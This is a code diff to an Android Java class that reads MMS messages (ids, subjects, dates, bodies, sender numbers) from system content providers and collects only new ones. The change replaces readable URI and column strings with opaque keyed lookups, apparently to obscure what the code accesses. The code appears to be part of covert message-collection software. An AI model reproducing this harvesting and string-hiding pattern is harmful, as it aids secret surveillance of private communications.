@@ -56,7 +56,7 @@ public class MmsBrowser {
 				Messages.getString("13.2"), Messages.getString("13.3"), Messages.getString("13.4"), Messages.getString("13.5") }; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
 		// 13.5=type
 		// 13.6=137
-		final String selection = Messages.getString("13.5") + "=" + Messages.getString("13.6"); //$NON-NLS-1$
+		final String selection = Messages.getString("13.5") + "=" + Messages.getString("13.6"); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 
 		final Cursor c = Status.getAppContext().getContentResolver().query(Uri.parse(content), null, null, null, null);
 
@@ -79,7 +79,7 @@ public class MmsBrowser {
 				intId = Integer.parseInt(id);
 				maxId = Math.max(maxId, intId);
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (parse): id = " + id);
+					Check.log(TAG + " (parse): id = " + id); //$NON-NLS-1$
 				}
 
 				if (intId <= lastManagedId) {
@@ -90,7 +90,7 @@ public class MmsBrowser {
 				// 13.8=sub
 				subject = c.getString(c.getColumnIndex(Messages.getString("13.8"))); //$NON-NLS-1$
 				// 13.9=date
-				String dateString = c.getString(c.getColumnIndex(Messages.getString("13.9"))).toString();
+				String dateString = c.getString(c.getColumnIndex(Messages.getString("13.9"))).toString(); //$NON-NLS-1$
 				date = Long.parseLong(dateString) * 1000; //$NON-NLS-1$
 
 				number = extractNumber(id, projection, selection);
@@ -145,22 +145,22 @@ public class MmsBrowser {
 
 	private String extractBody(String id) {
 		// multipart
-		String selectionPart = "mid=" + id;
-		Uri uri = Uri.parse("content://mms/part");
+		String selectionPart = "mid=" + id; //$NON-NLS-1$
+		Uri uri = Uri.parse(Messages.getString("M.5")); //$NON-NLS-1$
 		Cursor cursor = Status.getAppContext().getContentResolver().query(uri, null, selectionPart, null, null);
 		String body = null;
 		if (cursor.moveToFirst()) {
 			do {
-				String partId = cursor.getString(cursor.getColumnIndex("_id"));
-				String type = cursor.getString(cursor.getColumnIndex("ct"));
-				if ("text/plain".equals(type)) {
-					String data = cursor.getString(cursor.getColumnIndex("_data"));
+				String partId = cursor.getString(cursor.getColumnIndex("_id")); //$NON-NLS-1$
+				String type = cursor.getString(cursor.getColumnIndex(Messages.getString("M.7"))); //$NON-NLS-1$
+				if (Messages.getString("M.8").equals(type)) { //$NON-NLS-1$
+					String data = cursor.getString(cursor.getColumnIndex(Messages.getString("M.9"))); //$NON-NLS-1$
 
 					if (data != null) {
 						// implementation of this method below
 						body = getMmsText(partId);
 					} else {
-						body = cursor.getString(cursor.getColumnIndex("text"));
+						body = cursor.getString(cursor.getColumnIndex(Messages.getString("M.10"))); //$NON-NLS-1$
 					}
 				}
 			} while (cursor.moveToNext());
@@ -180,13 +180,13 @@ public class MmsBrowser {
 	}
 
 	private String getMmsText(String partId) {
-		Uri partURI = Uri.parse("content://mms/part/" + partId);
+		Uri partURI = Uri.parse(Messages.getString("M.11") + partId); //$NON-NLS-1$
 		InputStream is = null;
 		StringBuilder sb = new StringBuilder();
 		try {
 			is = Status.getAppContext().getContentResolver().openInputStream(partURI);
 			if (is != null) {
-				InputStreamReader isr = new InputStreamReader(is, "UTF-8");
+				InputStreamReader isr = new InputStreamReader(is, Messages.getString("M.12")); //$NON-NLS-1$
 				BufferedReader reader = new BufferedReader(isr);
 				String temp = reader.readLine();
 				while (temp != null) {
@@ -207,15 +207,15 @@ public class MmsBrowser {
 	}
 
 	private String getAddressNumber(String id) {
-		String selectionAdd = new String("msg_id=" + id);
-		String uriStr = MessageFormat.format("content://mms/{0}/addr", id);
+		String selectionAdd = new String(Messages.getString("M.13") + id); //$NON-NLS-1$
+		String uriStr = MessageFormat.format(Messages.getString("M.14"), id); //$NON-NLS-1$
 		Uri uriAddress = Uri.parse(uriStr);
 		Cursor cAdd = Status.getAppContext().getContentResolver().query(uriAddress, null, selectionAdd, null, null);
 		String name = null;
 		if (cAdd.moveToFirst()) {
 			do {
-				String number = cAdd.getString(cAdd.getColumnIndex("address"));
-				if (!Messages.getString("13.13").equals(number) && number != null) {
+				String number = cAdd.getString(cAdd.getColumnIndex(Messages.getString("M.15"))); //$NON-NLS-1$
+				if (!Messages.getString("13.13").equals(number) && number != null) { //$NON-NLS-1$
 					name = number;
 				}
 			} while (cAdd.moveToNext());
